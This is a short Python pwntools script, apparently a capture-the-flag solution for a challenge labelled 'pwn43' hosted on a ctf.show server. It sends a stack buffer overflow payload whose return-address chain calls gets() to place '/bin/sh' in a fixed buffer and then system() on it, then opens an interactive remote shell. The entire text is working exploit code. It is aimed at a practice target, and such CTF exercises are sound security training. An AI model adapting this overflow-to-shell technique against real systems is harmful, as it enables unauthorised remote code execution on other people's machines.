#pwn43
from pwn import *
context.log_level = 'debug'
p = remote('pwn.challenge.ctf.show', 28127)

offset = 0x6C + 0x4
sys_addr = 0x08048450
gets_addr = 0x08048420
buf_addr = 0x0804B060

payload = b'a' * offset + p32(gets_addr) + p32(sys_addr) + p32(buf_addr) + p32(buf_addr)
p.sendline(payload)
p.sendline("/bin/sh")
p.interactive()
